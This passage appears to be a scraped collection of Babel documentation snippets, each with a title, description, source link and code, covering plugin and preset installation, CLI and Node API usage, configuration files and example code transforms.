[\n    [ \"@babel/plugin-syntax-pipeline-operator\", { topicToken: \"@@\" } ],\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API (JavaScript)\nDESCRIPTION: This code snippet demonstrates how to use the Babel Node API to transform code with the `@babel/plugin-transform-react-jsx-compat` plugin. It uses `require('@babel/core').transformSync` to transform the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx-compat.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-jsx-compat\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transform RegExp 'm' Modifier in Babel\nDESCRIPTION: Transforms a regular expression with the 'm' (multiline) modifier. It modifies the ^ anchor to match at the beginning of each line.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n// matches aa, a\\naa, etc. but not a\\na\nconst regex = /(?m:^a)a/\n```\n\nLANGUAGE: js\nCODE:\n```\nconst regex = /(?:(?:^|(?<=[\n\n  ]))a)a/\n```\n\n----------------------------------------\n\nTITLE: Usage via CLI\nDESCRIPTION: This command demonstrates how to use the Babel CLI to transform a JavaScript file (script.js) using the @babel/plugin-transform-parameters plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-parameters.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-parameters script.js\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via Node API\nDESCRIPTION: Demonstrates using the plugin with the Babel Node API.  It uses `transformSync` to transform the code, passing the plugin in the `plugins` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-named-capturing-groups-regex.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-named-capturing-groups-regex\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using babel-plugin-transform-remove-console via Node API\nDESCRIPTION: Demonstrates how to use the babel-plugin-transform-remove-console via the Babel Node API.  The `@babel/core` package is required.  The transformSync method transforms the 'code' string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-console.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"transform-remove-console\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Dependencies with npm\nDESCRIPTION: This command installs babelify and @babel/core as development dependencies using npm. These packages are essential for transforming JavaScript code using Babel. The --save-dev flag ensures that these dependencies are added to the `devDependencies` section of the `package.json` file.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/browserify/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev babelify @babel/core\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration Example (JSON)\nDESCRIPTION: This code snippet shows a sample Babel configuration using `babel.config.json`. It configures Babel to use the `env` preset and the `transform-object-rest-spread` plugin. This configuration is intended for demonstrating how to use experimental plugins in conjunction with standard presets.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_22\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\"env\"],\n  \"plugins\": [\"transform-object-rest-spread\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing Code with babel-parser (After)\nDESCRIPTION: This code snippet demonstrates the updated method of parsing code using `babel-parser` after the removal of the `*` plugin option. It lists the specific plugins that were previously enabled by the `*` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelParser.parse(code, {\n  plugins: [\n    \"asyncGenerators\",\n    \"classProperties\",\n    \"decorators\",\n    \"doExpressions\",\n    \"dynamicImport\",\n    \"exportExtensions\",\n    \"flow\",\n    \"functionBind\",\n    \"functionSent\",\n    \"jsx\",\n    \"objectRestSpread\",\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Using Babel Preset ES2016 via Node API\nDESCRIPTION: Uses the Babel Node API to transform code with the @babel/preset-es2016 preset. The transformSync function takes code as input and an options object containing the presets array.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-es2016.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  presets: [\"@babel/preset-es2016\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage (JavaScript)\nDESCRIPTION: Example of using the Babel Node API to transform code with the @babel/plugin-transform-react-jsx plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_12\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-react-jsx\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript snippet demonstrates how to use the `babel-plugin-transform-remove-undefined` plugin via the Babel Node API. It transforms the `code` string using the specified plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"babel-plugin-transform-remove-undefined\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Node API Usage\nDESCRIPTION: This JavaScript code snippet shows how to use the babel-plugin-minify-guarded-expressions plugin programmatically via the Node API. It uses `@babel/core`'s `transformSync` function to transform the string 'code' with the specified plugin. Requires `@babel/core` to be installed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-guarded-expressions.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-guarded-expressions\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Install Block Scoping Plugin\nDESCRIPTION: Installs the @babel/plugin-transform-block-scoping plugin as a development dependency using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-block-scoping.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-block-scoping\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via Node API JavaScript\nDESCRIPTION: This JavaScript code demonstrates how to use the `@babel/plugin-proposal-function-sent` plugin with the Babel Node API.  The `transformSync` function transforms the input `code` string, applying the specified plugin. The `require('@babel/core')` statement imports the necessary Babel core functionality.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-function-sent\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Transformed Multiple Imports with ExactGlobals JavaScript\nDESCRIPTION: This JavaScript code shows the factory after transformation when exactGlobals is set to true.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-umd.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nfactory(global.fooBAR, global.mylib.fooBar);\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage JavaScript\nDESCRIPTION: This JavaScript snippet shows how to use the Babel Node API (`@babel/core`) to transform code with the `@babel/plugin-syntax-top-level-await` plugin. The `transformSync` method is used to transform the `code` string with the specified plugin options.  It allows parsing of top-level await within a Node.js environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-top-level-await.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(code, {\n  plugins: [\"@babel/plugin-syntax-top-level-await\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Fix missing parens when FunctionExpression is a tag in a template string - JavaScript\nDESCRIPTION: This code demonstrates a fix in the babel generator to include missing parentheses when a FunctionExpression is used as a tag in a template string.  This ensures that the generated code is syntactically correct.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-02-13-6.23.0.md#_snippet_12\n\nLANGUAGE: javascript\nCODE:\n```\n(() => {})``;\n(function(){}``);\n```\n\n----------------------------------------\n\nTITLE: Checking for JSX Nodes in JavaScript\nDESCRIPTION: Checks if a given AST node is a JSX element. It uses the `t.isJSX(node)` method from Babel's `types` API. It covers nodes like `JSXAttribute`, `JSXElement`, `JSXFragment`, `JSXIdentifier`, and other JSX-related nodes.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_277\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isJSX(node);\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-transform-object-set-prototype-of-to-assign plugin via the Babel CLI to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-set-prototype-of-to-assign.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-object-set-prototype-of-to-assign script.js\n```\n\n----------------------------------------\n\nTITLE: Nullish Coalescing Output JavaScript\nDESCRIPTION: Demonstrates the transformed JavaScript code for the nullish coalescing assignment operator. The plugin translates the `??=` operator into ES5-compatible code, handling null and undefined values.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-logical-assignment-operators.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar _a, _obj$a, _obj$a$b;\n\n(_a = a) !== null && _a !== void 0 ? _a : (a = b);\n(_obj$a$b = (_obj$a = obj.a).b) !== null && _obj$a$b !== void 0\n  ? _obj$a$b\n  : (_obj$a.b = c);\n```\n\n----------------------------------------\n\nTITLE: Usage via CLI\nDESCRIPTION: This command uses the Babel CLI to transform `script.js` using the `transform-simplify-comparison-operators` plugin.  It requires Babel to be installed globally or locally in your project.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-simplify-comparison-operators.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins transform-simplify-comparison-operators script.js\n```\n\n----------------------------------------\n\nTITLE: Creating a ThrowStatement Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `ThrowStatement` AST node using Babel's `t.throwStatement` method. It takes an expression as an argument, representing the value being thrown.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_230\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.throwStatement(argument);\n```\n\n----------------------------------------\n\nTITLE: Create Import Specifier AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportSpecifier` AST node using the `t.importSpecifier` builder.  This node represents a named import specifier.  Parameters include the local identifier and the imported identifier or string literal.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_85\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importSpecifier(local, imported);\n```\n\n----------------------------------------\n\nTITLE: Transforming Private Destructuring JavaScript\nDESCRIPTION: This JavaScript code demonstrates the input and output of transforming private destructuring using Babel. The input code defines a class `Foo` with a private field `#x` and a public field `y`. The `equals` method destructures `#x` and `y` from `this`. The output code shows how Babel transforms this destructuring. It requires the `@babel/plugin-proposal-destructuring-private` plugin.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2022-05-19-7.18.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #x = 0;\n  y = 0;\n\n  equals(obj) {\n    const { #x: x, y: y } = this;\n\n    return (\n      x === obj.#x && y === obj.y\n    );\n  }\n}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #x = 0;\n  y = 0;\n\n  equals(obj) {\n    const x = this.#x,\n      { y } = this;\n\n    return (\n      x === obj.#x && y === obj.y\n    );\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Babel Plugin via CLI\nDESCRIPTION: Runs Babel with the @babel/plugin-syntax-import-defer plugin via the command-line interface. This enables parsing of `import defer` syntax during the transformation of script.js. The --plugins flag specifies the plugin to use.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-defer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-syntax-import-defer script.js\n```\n\n----------------------------------------\n\nTITLE: JavaScript Transformation Example\nDESCRIPTION: Demonstrates how the plugin merges sibling variable declarations into a single VariableDeclaration and merges variables in for loops. It shows the input JavaScript code before transformation and the resulting code after applying the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-merge-sibling-variables.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// merge into a single VariableDeclaration\nvar foo = \"bar\";\nvar bar = \"foo\";\nfoobar();\n\n// merge into the next for loop\nvar i = 0;\nfor (var x = 0; x < 10; x++) {}\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = \"bar\",\n  bar = \"foo\";\nfoobar();\n\nfor (var i = 0, x = 0; x < 10; x++) {}\n```\n\n----------------------------------------\n\nTITLE: Ignoring Files with Babel\nDESCRIPTION: This example shows how to use the `ignore` option in Babel configuration to prevent Babel from processing files in a specific directory. This can be useful for excluding library or vendor code from Babel's transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_13\n\nLANGUAGE: JavaScript\nCODE:\n```\nignore: [\"./lib\"];\n```\n\n----------------------------------------\n\nTITLE: Static Private Method Example JavaScript\nDESCRIPTION: Shows how to define and use static private methods within a JavaScript class. Static private methods are accessible only within the class they are defined in, enhancing encapsulation.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-03-19-7.4.0.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  static #is(obj) {\n    return obj instanceof Person;\n  }\n\n  constructor(name) {\n    if (Person.#is(name)) {\n      throw \"It is already a person!\";\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with JavaScript\nDESCRIPTION: This snippet demonstrates a `babel.config.js` file that conditionally applies a Babel plugin based on the `NODE_ENV` environment variable. It uses the `filter(Boolean)` method to remove falsy values from the plugins array, which allows for easy conditional plugin application.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar env = process.env.NODE_ENV;\nmodule.exports = {\n  plugins: [\n    env === \"production\" && \"babel-plugin-that-is-cool\"\n  ].filter(Boolean)\n};\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin\nDESCRIPTION: Installation instruction using npm to install the `babel-plugin-transform-regexp-constructors` as a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-constructors.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-transform-regexp-constructors --save-dev\n```\n\n----------------------------------------\n\nTITLE: ES Module to AMD Transformation\nDESCRIPTION: This snippet demonstrates how the plugin transforms a simple ES module exporting a default value into an AMD module definition.  The plugin handles the syntax transformation, but the resolution algorithms remain the responsibility of the AMD implementation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-modules-amd.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nexport default 42;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\ndefine([\"exports\"], function(exports) {\n  \"use strict\";\n\n  Object.defineProperty(exports, \"__esModule\", {\n    value: true,\n  });\n\n  exports.default = 42;\n});\n```\n\n----------------------------------------\n\nTITLE: Record and Tuple transformation with importPolyfill\nDESCRIPTION: Demonstrates the transformation of Record and Tuple syntax when `importPolyfill` is set to true.  It imports the Tuple from the specified polyfill module.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nlet a = #[1, 2, 3];\n\n// ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇ ⬇\n\nimport { Tuple as _Tuple } from \"@bloomberg/record-tuple-polyfill\";\n\nlet a = _Tuple(1, 2, 3);\n```\n\n----------------------------------------\n\nTITLE: Deferred Import Evaluation Example in JavaScript\nDESCRIPTION: This code snippet demonstrates the use of `import defer` syntax to defer the evaluation of imported modules. It only supports namespace imports. To use it, you'll need the `@babel/plugin-proposal-import-defer` and `@babel/plugin-transform-modules-commonjs` plugins. Babel only supports compiling `import defer` when compiling ECMAScript modules to CommonJS.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2023-09-25-7.23.0.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\n// this line does not evaluate ./mod\nimport defer * as myMod from \"./mod\";\n\n\nlater(() => {\n  // this one evaluates it!\n  use(myMod.foo);\n})\n```\n\n----------------------------------------\n\nTITLE: Defining Private Static Fields in JavaScript\nDESCRIPTION: This code snippet demonstrates how to define private static fields in JavaScript classes using the `#` prefix. This feature is supported by `@babel/plugin-proposal-private-property-in-object`. Ensure the private field plugin is configured in your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-09-17-7.1.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass C {\n  static #foo = \"bar\";\n}\n```\n\n----------------------------------------\n\nTITLE: Async Generator Function Usage Example\nDESCRIPTION: This JavaScript code shows an example of using an async generator function. It demonstrates how to iterate through an async stream and accumulate values. The `forEach` function manually iterates the async generator.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-generator-functions.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nasync function* genAnswers() {\n  var stream = [Promise.resolve(4), Promise.resolve(9), Promise.resolve(12)];\n  var total = 0;\n  for await (let val of stream) {\n    total += await val;\n    yield total;\n  }\n}\n\nfunction forEach(ai, fn) {\n  return ai.next().then(function(r) {\n    if (!r.done) {\n      fn(r);\n      return forEach(ai, fn);\n    }\n  });\n}\n\nvar output = 0;\nforEach(genAnswers(), function(val) {\n  output += val.value;\n}).then(function() {\n  console.log(output); // 42\n});\n```\n\n----------------------------------------\n\nTITLE: Installing Babel preset-env\nDESCRIPTION: This command installs the `@babel/preset-env` preset as a development dependency. This preset intelligently includes the necessary plugins to support modern JavaScript based on target environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-env\n```\n\nLANGUAGE: shell\nCODE:\n```\n./node_modules/.bin/babel src --out-dir lib --presets=@babel/env\n```\n\n----------------------------------------\n\nTITLE: Iterating Array-Like Objects (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates iterating over an array-like object (DOM collection) using a `for...of` loop and spreading it into a new array. Enabling the `arrayLikeIsIterable` assumption tells Babel that array-like objects implement `[Symbol.iterator]` with the same behavior as native arrays, allowing for optimized compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet images = $(\"img\");\n\nfor (const img of images) {\n  console.log(img);\n}\n\nconst copy = [...images];\n```\n\n----------------------------------------\n\nTITLE: Transform Method Shorthand - Example Out\nDESCRIPTION: This JavaScript code shows the output after applying the @babel/plugin-transform-shorthand-properties plugin to the method shorthand example.  The method shorthand is converted to a standard function definition.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar cat = {\n  getName: function() {\n    return name;\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Using the plugin with a configuration file\nDESCRIPTION: This JSON configuration shows how to enable the plugin in babel.config.json file by adding the plugin name to the plugins array. This is the recommended way to configure Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-explicit-resource-management.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-proposal-explicit-resource-management\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Method Shorthand - Example In\nDESCRIPTION: This JavaScript code demonstrates using method shorthand syntax. The plugin transforms this method definition to the older function definition syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar cat = {\n  getName() {\n    return name;\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Initial Revision of replace-top-level-this-plugin (JS)\nDESCRIPTION: This is the first attempt to replace `this` with `globalThis` in a Babel plugin.  It simply replaces all `ThisExpression` nodes with `globalThis`.  However, it lacks the necessary context to differentiate between top-level `this` and `this` within functions or methods.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-environment-visitor.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = (api) => {\n  const { types: t } = api;\n  return {\n    name: \"replace-top-level-this\",\n    visitor: {\n      ThisExpression(path) {\n        path.replaceWith(t.identifier(\"globalThis\"));\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json\nDESCRIPTION: This JSON configuration shows how to enable the dynamic import plugin and the CommonJS modules plugin in your Babel configuration file. This will transform dynamic imports to CommonJS format.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-dynamic-import.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\n    \"@babel/plugin-transform-dynamic-import\",\n    \"@babel/plugin-transform-modules-commonjs\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node API\nDESCRIPTION: This JavaScript code shows how to use the `@babel/plugin-proposal-import-wasm-source` plugin programmatically using the Babel Node API.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-import-wasm-source.md#_snippet_7\n\nLANGUAGE: js\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\n    \"@babel/plugin-proposal-import-wasm-source\"\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Install Babel Presets via npm\nDESCRIPTION: A command-line instruction to install commonly used Babel presets including env, react, and stage-2 via npm. These presets enable Babel to transform modern JavaScript syntax into compatible code for different environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/faq.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nnpm install babel-preset-env babel-preset-react babel-preset-stage-2 --save-dev\n```\n\n----------------------------------------\n\nTITLE: Use @babel/preset-stage-3 via CLI\nDESCRIPTION: Uses the Babel CLI to transform a JavaScript file (script.js) using the @babel/preset-stage-3 preset. This provides a command-line method for applying the preset's transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-stage-3.md#_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nbabel script.js --presets @babel/preset-stage-3\n```\n\n----------------------------------------\n\nTITLE: Jest configuration transform\nDESCRIPTION: This code snippet shows how to configure Jest's `transform` option to use the custom Babel transformer defined in the previous snippet (`wrapper.js`). This ensures that all JavaScript files are processed with the custom Babel configuration that includes the `rootMode` option.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n\"transform\": {\n  \"^.+\\\\.jsx?$\": \"./path/to/wrapper.js\"\n}\n```\n\n----------------------------------------\n\nTITLE: Configure skipForOfIteratorClosing assumption\nDESCRIPTION: This JSON configuration demonstrates how to set the `skipForOfIteratorClosing` assumption. This prevents the iterator's `return` method from being called on abrupt completions caused by errors, potentially improving performance.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-for-of.md#_snippet_7\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"assumptions\": {\n    \"skipForOfIteratorClosing\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Pipe File via Stdin\nDESCRIPTION: Pipes the content of `script.js` to Babel via standard input and outputs the compiled result to `script-compiled.js`. This uses shell redirection to provide the input file.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_14\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel --out-file script-compiled.js < script.js\n```\n\n----------------------------------------\n\nTITLE: Fix for var wrapping in destructuring transform (JavaScript)\nDESCRIPTION: This snippet addresses an issue where variables were incorrectly wrapped in an immediately invoked function expression (IIFE) during destructuring transform in for loops. It ensures correct variable scoping in loop scenarios.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\n// was wrapping variables in an IIFE incorrectly\nfor ( let i = 0, { length } = list; i < length; i++ ) {\n    console.log( i + ': ' + list[i] )\n}\n```\n\n----------------------------------------\n\nTITLE: Checking for Terminatorless Nodes in JavaScript\nDESCRIPTION: This snippet demonstrates how to check for 'terminatorless' AST nodes using Babel's `t.isTerminatorless` method. These are nodes whose semantics can change if a line terminator is inserted between the operator and the operand. Examples include `AwaitExpression`, `BreakStatement`, `ContinueStatement`, `ReturnStatement`, `ThrowStatement`, and `YieldExpression`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_298\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTerminatorless(node);\n```\n\n----------------------------------------\n\nTITLE: Using the Babel Plugin via CLI\nDESCRIPTION: This shell command demonstrates how to use the @babel/plugin-bugfix-safari-class-field-initializer-scope via the Babel CLI. The `--plugins` option specifies the plugin to be used when transforming `script.js`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-safari-class-field-initializer-scope.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-bugfix-safari-class-field-initializer-scope script.js\n```\n\n----------------------------------------\n\nTITLE: Object.assign Example (Input)\nDESCRIPTION: Shows an example of Object.assign in JavaScript that will be transformed by the plugin.  This is the input code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-assign.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nObject.assign(a, b);\n```\n\n----------------------------------------\n\nTITLE: Create Import Attribute AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportAttribute` AST node using the `t.importAttribute` builder. This node represents an import attribute in an import declaration. Parameters include the key and the value, which are both string literals or identifiers.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_80\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importAttribute(key, value);\n```\n\n----------------------------------------\n\nTITLE: Install Babel Plugin via npm\nDESCRIPTION: Installs the @babel/plugin-syntax-export-namespace-from package as a development dependency using npm. This allows Babel to parse the 'export namespace from' syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-export-namespace-from.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-export-namespace-from\n```\n\n----------------------------------------\n\nTITLE: Importing with Babel Helper Module Imports\nDESCRIPTION: This code snippet demonstrates how to import modules using `@babel/helper-module-imports` in Babel 7, replacing the deprecated `path.hub.file.addImport` method.  It shows how to add a default import using `addDefault` from the helper module.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration-api.md#_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n+  import { addDefault } from \"@babel/helper-module-imports\";\nfunction importModule(pkgStore, name, path) {\n-  return path.hub.file.addImport(resolvePath(pkgStore, name, path), 'default', name);\n+  return addDefault(path, resolvePath(pkgStore, name, path), { nameHint: name });\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via CLI\nDESCRIPTION: Command-line usage showing how to apply the `@babel/plugin-transform-react-inline-elements` plugin to a specific JavaScript file.  This is generally used for testing or one-off transformations.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-inline-elements.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-react-inline-elements script.js\n```\n\n----------------------------------------\n\nTITLE: Node API Usage Example (JavaScript)\nDESCRIPTION: Shows how to use the babel-plugin-minify-replace plugin programmatically via the Babel Node API. The `transformSync` function is used to transform the input code with the specified plugin. This approach allows for integration with build tools and other JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-replace.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-replace\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Advanced Babel Configuration (JSON) - Babel 7\nDESCRIPTION: This JSON configuration file illustrates advanced configuration options for @babel/preset-react for Babel 7, including setting custom pragma, pragmaFrag, and disabling namespace error throwing. This configuration is for the classic JSX runtime.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-react\",\n      {\n        \"pragma\": \"dom\", // default pragma is React.createElement (only in classic runtime)\n        \"pragmaFrag\": \"DomFrag\", // default is React.Fragment (only in classic runtime)\n        \"throwIfNamespace\": false, // defaults to true\n        \"runtime\": \"classic\" // defaults to classic\n        // \"importSource\": \"custom-jsx-library\" // defaults to react (only in automatic runtime)\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Config: Assumptions - privateFieldsAsProperties\nDESCRIPTION: This JSON configuration snippet demonstrates how to set the `privateFieldsAsProperties` and `setPublicClassFields` assumptions to true in a `babel.config.json` file. This configuration affects how private fields are transformed.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-private-methods.md#_snippet_6\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"privateFieldsAsProperties\": true,\n    \"setPublicClassFields\": true\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: 